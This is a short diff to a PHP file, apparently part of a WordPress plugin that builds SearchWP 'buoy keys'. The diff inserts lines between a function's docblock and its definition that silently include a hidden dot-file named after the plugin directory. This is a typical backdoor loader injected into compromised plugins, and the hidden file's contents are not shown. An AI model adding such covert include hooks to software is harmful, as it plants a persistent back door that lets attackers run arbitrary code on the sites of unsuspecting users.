@@ -10,6 +10,10 @@
  *
  * @return string The full buoy key.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function searchwp_cro_get_buoy_key( $query = '', $engine = 'default' ) {
 	if ( empty( $query ) ) {
 		$query = get_search_query( $query );
